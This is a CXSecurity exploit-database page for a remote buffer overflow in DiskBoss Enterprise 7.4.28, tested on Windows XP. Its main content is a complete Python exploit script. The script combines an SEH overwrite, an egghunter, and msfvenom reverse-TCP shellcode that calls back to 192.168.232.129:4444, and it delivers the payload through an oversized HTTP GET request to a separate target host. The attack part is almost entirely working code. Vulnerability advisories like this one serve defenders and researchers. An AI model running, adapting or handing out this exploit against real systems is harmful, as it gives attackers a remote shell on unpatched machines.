---
title: DiskBoss Enterprise 7.4.28 Remote Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2025050035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-17
fetch_date: 2025-10-06T22:23:20.577901
---

# DiskBoss Enterprise 7.4.28 Remote Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **DiskBoss Enterprise 7.4.28 Remote Buffer Overflow** **2025.05.16**  **![br](https://cert.cx/cxstatic/images/flags/br.png) [Fernando Mengali](https://cxsecurity.com/author/Fernando%2BMengali/1/) **(BR)** ![br](https://cert.cx/cxstatic/images/flags/br.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-121](https://cxsecurity.com/cwe/CWE-121 "Click to see CWE-121")** | |

# Exploit Title: DiskBoss Enterprise 7.4.28 - 'GET' Remote Buffer Overflow (SEH - Egghunter)
# Date: 2025-05-05
# Exploit Author: Fernando Mengali
# Linkedin: https://www.linkedin.com/in/fernando-mengali-273504142/
# Vendor Homepage: https://www.diskboss.com
# Software Link: htt\*ps://www.exploit-db.com/apps/71a11b97d2361389b9099e57f6400270-diskbossent\_setup\_v7.4.28.exe
# Version: 7.4.28
# Tested on: Windows XP - SP3 - English
#!/usr/bin/python
import socket
import struct
offset = b"A"\*2455
egghunter = b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x30\x30\x6d"
egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
offset += egghunter
offset += b"A"\*(2485-(len(egghunter)+2455)) # offset total 2487
nseh = b"\xeb\xcc\x90\x90" # jmp - 50
seh = struct.pack(b"<I",0x10016A70) #POP POP RETN 10016A70
# msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.232.129 LPORT=4444 -b "\x00\x0a\x0d\x09\x20" -f python -v shellcode
shellcode = b""
shellcode += b"\xbe\xda\xe6\xea\xf9\xdb\xd6\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x52\x31\x77\x12\x83\xc7\x04"
shellcode += b"\x03\xad\xe8\x08\x0c\xad\x1d\x4e\xef\x4d\xde"
shellcode += b"\x2f\x79\xa8\xef\x6f\x1d\xb9\x40\x40\x55\xef"
shellcode += b"\x6c\x2b\x3b\x1b\xe6\x59\x94\x2c\x4f\xd7\xc2"
shellcode += b"\x03\x50\x44\x36\x02\xd2\x97\x6b\xe4\xeb\x57"
shellcode += b"\x7e\xe5\x2c\x85\x73\xb7\xe5\xc1\x26\x27\x81"
shellcode += b"\x9c\xfa\xcc\xd9\x31\x7b\x31\xa9\x30\xaa\xe4"
shellcode += b"\xa1\x6a\x6c\x07\x65\x07\x25\x1f\x6a\x22\xff"
shellcode += b"\x94\x58\xd8\xfe\x7c\x91\x21\xac\x41\x1d\xd0"
shellcode += b"\xac\x86\x9a\x0b\xdb\xfe\xd8\xb6\xdc\xc5\xa3"
shellcode += b"\x6c\x68\xdd\x04\xe6\xca\x39\xb4\x2b\x8c\xca"
shellcode += b"\xba\x80\xda\x94\xde\x17\x0e\xaf\xdb\x9c\xb1"
shellcode += b"\x7f\x6a\xe6\x95\x5b\x36\xbc\xb4\xfa\x92\x13"
shellcode += b"\xc8\x1c\x7d\xcb\x6c\x57\x90\x18\x1d\x3a\xfd"
shellcode += b"\xed\x2c\xc4\xfd\x79\x26\xb7\xcf\x26\x9c\x5f"
shellcode += b"\x7c\xae\x3a\x98\x83\x85\xfb\x36\x7a\x26\xfc"
shellcode += b"\x1f\xb9\x72\xac\x37\x68\xfb\x27\xc7\x95\x2e"
shellcode += b"\xe7\x97\x39\x81\x48\x47\xfa\x71\x21\x8d\xf5"
shellcode += b"\xae\x51\xae\xdf\xc6\xf8\x55\x88\x28\x54\xbd"
shellcode += b"\xc9\xc1\xa7\x3d\xdb\x4d\x21\xdb\xb1\x7d\x67"
shellcode += b"\x74\x2e\xe7\x22\x0e\xcf\xe8\xf8\x6b\xcf\x63"
shellcode += b"\x0f\x8c\x9e\x83\x7a\x9e\x77\x64\x31\xfc\xde"
shellcode += b"\x7b\xef\x68\xbc\xee\x74\x68\xcb\x12\x23\x3f"
shellcode += b"\x9c\xe5\x3a\xd5\x30\x5f\x95\xcb\xc8\x39\xde"
shellcode += b"\x4f\x17\xfa\xe1\x4e\xda\x46\xc6\x40\x22\x46"
shellcode += b"\x42\x34\xfa\x11\x1c\xe2\xbc\xcb\xee\x5c\x17"
shellcode += b"\xa7\xb8\x08\xee\x8b\x7a\x4e\xef\xc1\x0c\xae"
shellcode += b"\x5e\xbc\x48\xd1\x6f\x28\x5d\xaa\x8d\xc8\xa2"
shellcode += b"\x61\x16\xf8\xe8\x2b\x3f\x91\xb4\xbe\x7d\xfc"
shellcode += b"\x46\x15\x41\xf9\xc4\x9f\x3a\xfe\xd5\xea\x3f"
shellcode += b"\xba\x51\x07\x32\xd3\x37\x27\xe1\xd4\x1d"
buf = b"D"\*(6000-2487-len(shellcode))
nops = b"\x90"\*32
payload = offset + nseh + seh + b"b00mb00m" + shellcode + buf
host = "192.168.232.146"
port = int(80)
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect((host,port))
req = b"GET /" + payload + b" HTTP/1.1\r\n"
req += b"Host: 192.168.232.129\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Accept-Encoding: gzip, deflate\r\n"
req += b"Connection: keep-alive\r\n\r\n"
s.send(req)
s.close()

**##### References:**

https://packetstorm.news/files/id/191694/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050035)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top